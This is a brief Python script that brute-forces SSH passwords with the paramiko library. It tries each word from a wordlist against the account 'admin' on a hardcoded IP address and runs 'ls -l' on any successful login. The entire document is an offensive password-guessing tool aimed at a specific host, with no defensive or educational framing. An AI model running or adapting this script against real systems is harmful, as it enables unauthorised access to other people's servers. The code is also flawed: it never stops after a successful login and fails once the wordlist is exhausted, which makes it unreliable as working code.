import paramiko

hostname = '20.205.18.148'
username = 'admin'
wordlistPath = './wor'

wordListFile = open("wordlist.txt", "r", encoding="utf-8", errors="ignore")
words = [line.strip() for line in wordListFile]

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

i = 0
while True:
    password = words[i]
    try:
        client.connect(hostname, username=username, password=password)
        stdin, stdout, stderr = client.exec_command('ls -l')
        output = stdout.read().decode('utf-8')
        error = stderr.read().decode('utf-8')
        if output:
            print("Command Output:")
            print(output)
        if error:
            print("Command Error:")
            print(error)
    except paramiko.AuthenticationException:
        print("Authentication failed.")
    except paramiko.SSHException as e:
        print(f"SSH connection error: {e}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
    finally:
        client.close()
        wordListFile.close()
    i += 1
